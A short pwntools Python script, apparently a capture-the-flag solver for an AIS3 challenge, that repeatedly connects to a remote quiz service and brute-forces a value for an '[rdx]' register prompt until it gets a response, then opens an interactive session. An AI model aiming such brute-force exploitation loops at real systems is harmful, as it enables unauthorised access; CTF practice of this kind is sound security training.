from pwn import *


cur_a = 0
while True:
    r = remote('quiz.ais3.org', 10101)
    r.recvuntil('[rdx]')
    cur_a+=1
    log.info(str(cur_a))
    r.sendline(str(cur_a))
    r.sendline('0')
    r.sendline('0')
    r.sendline('0')
    res = r.recvline()
    if res != '\n':
        print(res)
        break
    r.close()
r.interactive()
